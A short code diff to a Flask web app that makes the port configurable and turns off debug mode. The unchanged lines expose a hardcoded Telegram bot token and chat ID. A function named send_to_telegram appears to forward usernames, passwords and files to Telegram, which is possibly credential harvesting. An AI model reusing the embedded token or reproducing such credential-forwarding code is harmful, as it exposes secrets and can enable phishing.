@@ -7,10 +7,12 @@ from telegram.error import TelegramError
 import threading
 import base64 
 import asyncio
+import os
 
 app = Flask(__name__)
 
 # Конфигурация
+port = int(os.environ.get("PORT", 5000))
 TELEGRAM_BOT_TOKEN = '1903509391:AAFVvTLNLVEDwUxtPpasNbsrTMR0tK0LMhg'
 TELEGRAM_CHAT_ID = '379344747'
 UPLOAD_FOLDER = 'static/uploads'
@@ -175,4 +177,4 @@ def send_to_telegram(filepath, username, password):
 
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=port)
